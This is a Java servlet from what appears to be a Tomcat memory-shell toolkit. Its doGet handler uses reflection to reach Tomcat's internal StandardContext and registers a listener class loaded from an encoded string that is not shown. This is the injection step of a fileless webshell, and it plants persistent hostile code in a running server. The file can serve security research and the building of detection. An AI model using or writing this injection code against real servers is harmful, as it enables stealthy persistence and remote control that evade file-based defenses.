package com.tomcat.memshell.Listener;

import com.tomcat.util.ClassUtil;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;

public class MemListener extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try{
            // StandardContext#addApplicationEventListener
            ServletContext servletContext = req.getSession().getServletContext();
            Field servletfield = servletContext.getClass().getDeclaredField("context");
            servletfield.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);
            Field contextfield = applicationContext.getClass().getDeclaredField("context");
            contextfield.setAccessible(true);
            StandardContext standardContext = (StandardContext) contextfield.get(applicationContext);

            Class<?> classListener = ClassUtil.getClass(ClassUtil.LISTENER_STRING);

            standardContext.addApplicationEventListener(classListener.newInstance());

            PrintWriter writer = resp.getWriter();
            writer.println("tomcat listener added");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
